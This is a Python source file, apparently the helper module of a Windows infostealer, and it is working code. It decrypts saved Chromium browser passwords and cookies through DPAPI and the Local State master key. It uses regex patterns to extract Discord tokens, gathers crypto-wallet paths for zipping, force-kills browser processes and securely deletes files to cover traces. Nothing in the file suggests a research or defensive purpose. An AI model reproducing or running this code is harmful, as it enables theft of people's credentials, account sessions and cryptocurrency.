import os
import platform
import json
import base64
import re
import sqlite3
import shutil
import tempfile
import hashlib
import random
import string
from datetime import datetime
from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]

def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)

def DecryptValue(buff, master_key=None):
    try:
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts == 'v10' or starts == 'v11':
            iv = buff[3:15]
            payload = buff[15:]
            from Crypto.Cipher import AES
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        else:
            return CryptUnprotectData(buff).decode()
    except:
        return None

def get_master_key(path):
    try:
        if not os.path.exists(path): return None
        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read(): return None

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key)
        return master_key
    except:
        return None

def extract_discord_tokens_regex(text):
    tokens = []
    patterns = [
        r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',
        r'mfa\.[\w-]{84}',
    ]
    for pattern in patterns:
        found = re.findall(pattern, text)
        tokens.extend(found)
    return tokens

def get_all_browser_profiles(base_path):
    profiles = []
    if not os.path.exists(base_path):
        return profiles
    
    try:
        if os.path.isdir(base_path):
            roots = ["Default", "Guest Profile"]
            for item in os.listdir(base_path):
                if item in roots or item.startswith("Profile "):
                    profiles.append(item)
                elif os.path.exists(os.path.join(base_path, item, "Login Data")):
                    profiles.append(item)
                elif os.path.exists(os.path.join(base_path, item, "Cookies")):
                    profiles.append(item)
    except: pass
    
    if not profiles:
        profiles = ["."]
    
    return list(set(profiles))

def load_json_config(filename):
    config_path = os.path.join(os.path.dirname(__file__), "paths", filename)
    try:
        with open(config_path, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def expand_path(path_template):
    local = os.getenv("LOCALAPPDATA")
    roaming = os.getenv("APPDATA")
    return path_template.replace("{LOCALAPPDATA}", local).replace("{APPDATA}", roaming)

def GatherAll():
    browser_config = load_json_config("browser.json")
    discord_config = load_json_config("discord.json")
    wallet_config = load_json_config("wallet.json")
    
    browserPaths = []
    for browser in browser_config.get("chromium_browsers", []):
        path = expand_path(browser["path"])
        browserPaths.append([
            path,
            browser["executable"],
            browser["local_storage"],
            browser["login_data"],
            browser["network"],
            browser["extensions"]
        ])
    
    discordPaths = []
    for discord in discord_config.get("discord_clients", []):
        path = expand_path(discord["path"])
        discordPaths.append([path, discord["local_storage"]])
    
    PathsToZip = []
    for wallet in wallet_config.get("wallets", []):
        path = expand_path(wallet["path"])
        PathsToZip.append([path, wallet["executable"], wallet["type"]])
    
    return browserPaths, discordPaths, PathsToZip

def get_file_hash(file_path):
    sha256_hash = hashlib.sha256()
    try:
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(16777216), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()
    except:
        return None

def current_time(seconds_also=False):
    return datetime.now().strftime('%d.%m.%Y_%H.%M' if not seconds_also else '%d.%m.%Y_%H.%M.%S')

def generate_random_string(length=16):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def secure_delete_file(path, passes=1):
    try:
        length = os.path.getsize(path)
        with open(path, "br+", buffering=-1) as f:
            for i in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
        os.remove(path)
        return True
    except:
        return False

def kill_browser_processes():
    import psutil
    browser_processes = [
        'chrome.exe', 'firefox.exe', 'brave.exe', 'opera.exe',
        'msedge.exe', 'yandex.exe', 'vivaldi.exe', 'iridium.exe'
    ]
    
    for proc in psutil.process_iter(['name']):
        try:
            if proc.info['name'].lower() in browser_processes:
                proc.kill()
        except:
            pass